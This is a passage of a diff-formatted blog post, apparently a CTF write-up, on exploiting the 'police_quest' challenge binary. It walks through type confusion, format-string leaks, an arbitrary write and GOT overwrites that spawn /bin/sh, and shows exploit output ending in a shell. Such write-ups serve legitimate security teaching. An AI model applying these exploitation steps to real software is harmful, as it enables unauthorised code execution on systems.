+  <li>We can write 16 bytes to anywhere we want</li>
+</ol>
+
+<p>As shown, we control the serial number of a bullet and the mark buffer.
+The serial number will be used as an address and 16 bytes of the mark buffer will be copied at the given address.</p>
+
+<p>When looking at the following structures:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">00000000 target_obj      struc ; (sizeof=0x68, mappedto_9)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?                    ; base 2
+00000020 target_name     dq ?                    ; XREF: create_target+38/w ; offset
+00000028 detail          db 64 dup(?)
+00000068 target_obj      ends
+00000068
+00000000 ; ---------------------------------------------------------------------------
+00000000
+00000000 bullet_obj      struc ; (sizeof=0x78, mappedto_11)
+00000000                                         ; XREF: use_bullet+C/o
+00000000                                         ; use_bullet+68/o
+00000000 prev            dq ?
+00000008 next            dq ?
+00000010 type            dd ?
+00000014 hash            dd ?
+00000018 desc            dq ?
+00000020 serial_number   dq ?                    ; XREF: use_bullet+5C/w
+00000020                                         ; use_bullet+64/r ...
+00000028 mark            dq ?                    ; XREF: create_bullet+170/r
+00000028                                         ; create_bullet+1A0/r ... ; offset
+00000030 detail          db 64 dup(?)
+00000070 is_ready        dq ?                    ; XREF: use_bullet+68/w
+00000070                                         ; action_get+FB/r
+00000078 bullet_obj      ends</code></pre></figure>
+
+<p>We can see that if we exploit a type confusion between a target and a bullet, target_obj.target_name is aligned to bullet_obj.serial_number (which we control).</p>
+
+<h2 id="ideas">Ideas</h2>
+
+<ol>
+  <li>We need to be able to use the format string and arbitrary write16 as much as we want (infinite objects of kind “Tissue” and “Bullet”)</li>
+  <li>In order to be able to do this, we need to be able to modify the all_objects table to set our tissues and bullets quantity to 0xffffffff</li>
+  <li>So we need an address in the stack, and address in the heap and one in the binary</li>
+  <li>For the payload, since I am lazy, I’m not doing any ROP and I can’t use shellcode because of NX.</li>
+</ol>
+
+<p>Steps 1 and 2 are pretty easy once the necessary addresses are leaked in step 3.
+Step 4 is a little more interesting as it needed some more reversing.</p>
+
+<p>Once we can exploit the format string and arbitrary write16 as much as we want, we’ll build a leaking primitive to leak anything. This will allow us to bypass ASLR/PIE.</p>
+
+<h2 id="leaking-primitive">Leaking primitive</h2>
+
+<p>Our leak primitive is based on the format string vulnerability.
+The idea is to do the following:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre><span class="n">printf</span><span class="p">(</span><span class="s">"%750$s"</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="p">...,</span> <span class="n">arg750</span><span class="p">);</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<h2 id="our-payload">Our payload</h2>
+
+<p>So, in order to avoid ROP, I will use the old ret2libc technique but with some “weird” gadgets.
+ROP is cool but it is not the most reliable technique as it needs tons of gadgets addresses, it’s painful to build, it can take room, etc.</p>
+
+<p>In order to spawn our shell, I wanted to have this:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="code"><pre><span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="c1">// rdi = &amp;"/bin/sh"</span>
+<span class="c1">// rsi = NULL</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>While reversing, I found this beautiful gadget 0 in the main() function:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:0000000000002838                 mov     esi, 0          ; buf
+.text:000000000000283D                 mov     rdi, rax        ; stream
+.text:0000000000002840                 call    _setbuf</code></pre></figure>
+
+<p>We patch the _setbuf() entry with execl(), luckily _setbuf() is not called anywhere else so it’s perfect.</p>
+
+<p>Now I needed a gadget to set rax to point to “/bin/sh”.</p>
+
+<p>I ended up finding this gadget 1 in run_turn():</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:0000000000002758 loc_2758:                               ; CODE XREF: run_turn+1E6↑j
+.text:0000000000002758                 lea     rax, [rbp+user_input]
+.text:000000000000275F                 mov     edx, 5          ; n
+.text:0000000000002764                 mov     rsi, rax        ; s2
+.text:0000000000002767                 lea     rdi, aMove      ; "MOVE "
+.text:000000000000276E                 call    _strncmp</code></pre></figure>
+
+<p>Yeepee! rax is set to user_input, which we control entirely thanks to the fgets preceding it.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">.text:00000000000026B2                 lea     rax, [rbp+user_input]
+.text:00000000000026B9                 mov     esi, 0FFFh      ; n
+.text:00000000000026BE                 mov     rdi, rax        ; s
+.text:00000000000026C1                 call    _fgets
+.text:00000000000026C6                 test    rax, rax
+.text:00000000000026C9                 jnz     short loc_26E1</code></pre></figure>
+
+<ol>
+  <li>Patch setbuf() got entry with execl() function address</li>
+  <li>Patch strncmp() got entry with the gadget 0 address (setbuf call location)</li>
+  <li>Send “/bin/sh” to get our shell</li>
+</ol>
+
+<p>When we send “/bin/sh”, this gets passed to strncmp() (which is now pointing to our setbuf gadget).
+Then our execl() gets called and we get our shell :).</p>
+
+<h2 id="primitives">Primitives</h2>
+
+<p>Yet again about these “famous” primitives.
+When you read modern exploitation papers, “everyone” talks about primitives all the time.
+The most common primitives are : read memory, write memory and execute arbitrary code.</p>
+
+<p>As soon as you get the read memory <strong>and</strong> write memory primitives, you generally can get the execute arbitrary code.
+This allows the exploit writer to leak anything and corrupt program state even further as he sees fit in order to get arbitrary code execution. I won’t get into the details as there are many many many techniques.</p>
+
+<p>Using vulnerabilities you thus strive to build primitives.
+We could imagine other primitives:</p>
+<ul>
+  <li>build a brainfuck interpreter : https://nebelwelt.net/publications/files/16BalCCon-presentation.pdf</li>
+  <li>read/write files</li>
+  <li>random pool exhaustion</li>
+  <li>is_valid_address() (allows to break ASLR among other things) : https://hackaday.com/2017/02/15/aslrcache-attack-defeats-address-space-layout-randomization/</li>
+  <li>arbitrary file upload</li>
+  <li>etc</li>
+</ul>
+
+<h2 id="exploitation-summary">Exploitation summary</h2>
+
+<p>So, I came up with the following exploitation steps:</p>
+
+<ol>
+  <li>Get all objects. Make sure to include the 8 bytes “%lx.%lx.” format string as the Revolver serial.</li>
+  <li>Use the type confusion in the function use_magnifyingglass() so the Revolver is used as a target and thus the serial is used as a format string, this allows us to leak a stack address and a heap address.</li>
+  <li>Use bullet 1 to re-activate the format string</li>
+  <li>Use bullet 2 to extend the revolver format string</li>
+  <li>Exploit the format string again to leak more values, we get the all_objects address, we got an address in the binary</li>
+  <li>Use bullet 3 to have infinite bullets, so we now have infinite write16</li>
+  <li>Get infinite tissues, so we now have infinite format strings</li>
+  <li>Leak execl() address</li>
+  <li>Patch setbuf() got entry to execl()</li>
+  <li>Patch strncmp() got entry to jump to setbuf call</li>
+  <li>Trigger the strncmp() call so the shell is spawn</li>
+  <li>Get the shell, get the flag</li>
+</ol>
+
+<h1 id="porting-the-exploit">Porting the exploit</h1>
+
+<p>In order to port the exploit, only 1 offset needs to be changed : the format string direct parameters location.</p>
+
+<figure class="highlight"><pre><code class="language-diff" data-lang="diff"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="code"><pre><span class="gd">--- poc_obj_ubuntu.py	2018-12-27 04:19:38.963278180 +0100
+</span><span class="gi">+++ poc_obj_docker.py	2018-12-27 04:19:24.231781128 +0100
+</span><span class="gu">@@ -40,7 +40,7 @@
+</span>         self.addr_objects   = 0
+         self.addr_stack     = 0
+         # target
+<span class="gd">-        self.target = process ('./police_quest')
+</span><span class="gi">+        self.target = remote ('127.0.0.1', 10100)
+</span> 
+     def create_hash (self, obj_desc, obj_name):
+         if obj_desc not in self.obj_magic:
+<span class="gu">@@ -353,7 +353,7 @@
+</span>         leaked = leaked.split ('.')
+ 
+         self.addr_stack = hex_to_addr (leaked[0])
+<span class="gd">-        self.addr_fmt_args = self.addr_stack + 0x25e8
+</span><span class="gi">+        self.addr_fmt_args = self.addr_stack + 0x2638
+</span>         self.addr_heap = hex_to_addr (leaked[1])
+ 
+         print 'addr_stack       : 0x%x' % self.addr_stack</pre></td></tr></tbody></table></code></pre></figure>
+
+<h1 id="targetless">Targetless</h1>
+
+<p>To get the targetless part, I used a simple primitive to find our 750th format string direct parameter argument.
+750th was chosen because it was far enough in the stack as it didn’t seem used that much and it was not at the end of the stack.</p>
+
+<p>The idea is to write and leak.
+As long as I don’t leak the written value with the format string “%750$lx”, I continue hunting until:</p>
+
+<ul>
+  <li>the challenge crash, exploit failed</li>
+  <li>the defined maximum stack address is reached, exploit failed</li>
+  <li>the value gets leaked, the address is found, exploitation continues</li>
+</ul>
+
+<p>There are some hardcoded offsets dependant on the challenge binary. This can be fixed but exploitation would be way slower.
+The idea being to leak the binary using the format string and then parse it to dynamically find offsets.</p>
+
+<h1 id="exploit-output">Exploit Output</h1>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">m101@m101-desktop:~/police_quest$ ./poc_obj_targetless.py 
+[+] Opening connection to 127.0.0.1 on port 10100: Done
+[+] Get objects
+-&gt; Encode format string in Revolver serial
+[+] Exploit type confusion between Target and Revolver
+     Our Revolver serial gets used as a format string
+leaked           : 7ffcb81ec050.55f103059010.
+addr_stack       : 0x7ffcb81ec050
+addr_heap        : 0x55f103059010
+[+] Use Bullet 1 : Re-Activate Glass (format string)
+[+] Use Bullet 2 : Extend revolver format string
+[+] Exploit type confusion between Target and Revolver again
+     The Revolver "format string" was extended to leak more
+leaked           : 7ffcb81ec050.55f103059010.55f102b0a0c0.7f78406d1700.7f784015599a.7ffcb81ee880.o 
+addr_base        : 0x55f102905000
+addr_objects     : 0x55f102b0a0c0
+create_bullet    : 0x55f102906bdd
+create_tissue    : 0x55f102906de2
+[+] Use Bullet 3 : Get infinite bullets (so infinite arbitrary write)
+[+] Now get infinite tissues (so infinite format string)
+[+] We finished setting up our preliminary steps for exploitation
+     -&gt; Now the real fun begins
+[+] Looking for our format string leaker address location
+addr_cur         : 7ffcb81efe10
+addr_max         : 7ffcb81f2000
+Found addr_arg   : 7ffcb81efe80
+[+] Now resolving strncmp and execl
+strncmp          : 0x7f78402296c0
+[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.
+[+] Finding base address: 0x7f784010a000
+[+] Resolving 'execl': 0x7f78406d44c0
+           execl : 0x7f78401c45c0
+[+] Setting setbuf got entry to execl so we can execute our command later on
+[+] Setting strncmp got entry to setbuf call so we can trigger our shell
+[+] Trigger our shell
+[*] Switching to interactive mode
+
+$ ls
+bin
+flag.txt
+lib
+lib32
+lib64
+run
+$ cat flag.txt
+[CENSORED]
+$ </code></pre></figure>
+
+<h1 id="reliability">Reliability</h1>
+
+<p>The golden rule in exploitation is reliability.
+The more reliable your exploit is, the less crashes it will cause and it will thus be less suspicious.</p>
+
+<p>Concerning this challenge, while testing and relaunching the exploit multiple times, I got a reliability of around 65-70% after around 1000-2000 runs.
+This can be improved but it should be good enough for a challenge.</p>
+
+<p>To improve reliability, there are still many possibilities for the motivated readers to explore:</p>
+
+<ol>
+  <li>statistics on where the format string parameters most commonly land, this will avoid crashes due to junked pointers or important values</li>
+  <li>use the format string to inject the address to leak, the address of the parameter to inject must not have bad chars</li>
+  <li>there is the possibility to inject the bad char 0xa and write a primitive to inject any value in this challenge</li>
+  <li>Possibly other techniques but this wasn’t researched</li>
+</ol>
+
+<p>For the 3rd idea, I haven’t tried but if we look closely at the write16 code for instance:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="code"><pre>        <span class="n">printf</span><span class="p">(</span><span class="s">"Bullets leave a mark. What mark should this one leave? &gt; "</span><span class="p">,</span> <span class="mi">255LL</span><span class="p">);</span>
+<span class="cm">/* 1 */</span> <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">fgets</span><span class="p">(</span><span class="n">cur_bullet</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"Fine!"</span><span class="p">);</span>
+          <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">cur_mark</span> <span class="o">=</span> <span class="n">cur_bullet</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">;</span>
+<span class="cm">/* 2 */</span> <span class="n">cur_mark</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">cur_bullet</span><span class="o">-&gt;</span><span class="n">mark</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<ol>
+  <li>fgets() only stops reading if there is an EOF or a newline. It means it accepts “\x00” as valid input</li>
+  <li>This zero out only the byte before the first “\x00”</li>
+</ol>
+
+<p>So imagine this buffer:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">"abcdef\n\x00" -&gt; "abcdef\x00\x00"</code></pre></figure>
+
+<p>Ok expected result.</p>
+
+<p>Now, another example:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">"abcdef\x00\x00\n" -&gt; "abcde\x00\x00\x00\n"</code></pre></figure>
+
+<p>Whoops, the “\n” is still there.
+This subtle bug will allow us to insert “\n” at will.
+The trick to write a value containing “\n” is in multiple writes so care must be taken not to junk critical data.</p>
+
+<p>For the motivated readers who explore some of these paths, they’ll see that the amount of work to get more reliability is exponential.
+Reliability is the result of an exponential amount of time needed. The last percents of reliability will need more work and way more code.</p>
+
+<h1 id="more-research-ideas">More research ideas</h1>
+
+<p>Once you got your shell in TheColonial’s challenge, you’ll end up in a chrooted environment with 3 binaries : sh, ls and cat.
+Unfortunately, there are no suid binaries or proper permissions to escape the chroot jail.
+In order to escape, you’ll need to get root through a kernel exploit. IF you got one appropriate for the host, you may as well escape the docker jail.</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>This challenge was interesting in multiple ways as a deep understanding of the binary is necessary and mostly, multiple vulnerabilities needed to be exploited. Finally, the main “modern” protections have been enabled and these were all bypassed.
+Concerning the payload, it was not shellcode, it was not ROP, ret2libc did the job thanks to manually found gadgets.</p>
+
+<p>Th goal of this post was to show some of the exploitation process I go through when I have a vulnerability and I need to get a shell. Hopefully, it was helpful and interesting, don’t hesitate to contact me just for constructive suggestions/chatting.</p>
+
+<p>With the proper vulnerabilities and proper primitives, you can always get a shell. Here we ended up building an arbitrary read and arbitrary write which allows us to further corrupt program state in order to spawn a shell.</p>
+
+<p>m_101</p>
+
+<h1 id="resources">Resources</h1>
+
+<ul>
+  <li>The challenge : <a href="https://github.com/OJ/police-quest">here</a></li>
+  <li>My exploits :
+    <ul>
+      <li><a href="/assets/others/police_quest/poc_obj_ubuntu.py">Ubuntu</a></li>
+      <li><a href="/assets/others/police_quest/poc_obj_docker.py">Docker</a></li>
+      <li><a href="/assets/others/police_quest/poc_obj_targetless.py">Targetless</a></li>
+      <li><a href="/assets/others/police_quest/README.md">README</a></li>
+    </ul>
+  </li>
+  <li>“Exploiting Format String Vulnerabilities” by scut from TESO : <a href="/assets/others/docs/exploit/formatstring-1.2.pdf">here</a></li>
+</ul>
+
+  </div>
+
+  <div class="post-navigation">
+    
+    <a class="post-prev" href="/binholic/2018/04/28/windows-kernel-exploitation-token.html">Previous : Windows Kernel Exploitation : Token stealing payload with the reference counter updated</a>
+    
+
+    
+  </div>
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function () {
+            this.page.url = "http://binholic.com/binholic/2018/12/27/police_quest.html";
+            this.page.identifier = "/binholic/2018/12/27/police_quest";
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+
+            s.src = '//binholic.disqus.com/embed.js';
+
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+  
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+      <div class="site-footer">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
+<g>
+	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
+</g>
+</svg></span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!-- Created with Inkscape (http://www.inkscape.org/) -->
+<svg
+   xmlns:svg="http://www.w3.org/2000/svg"
+   xmlns="http://www.w3.org/2000/svg"
+   version="1.0"
+   width="79.12"
+   height="52.64">
+  <defs/>
+  <g
+     transform="translate(-47.495719,-111.30691)">
+    <path
+       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
+       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
+  </g>
+</svg>
+</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
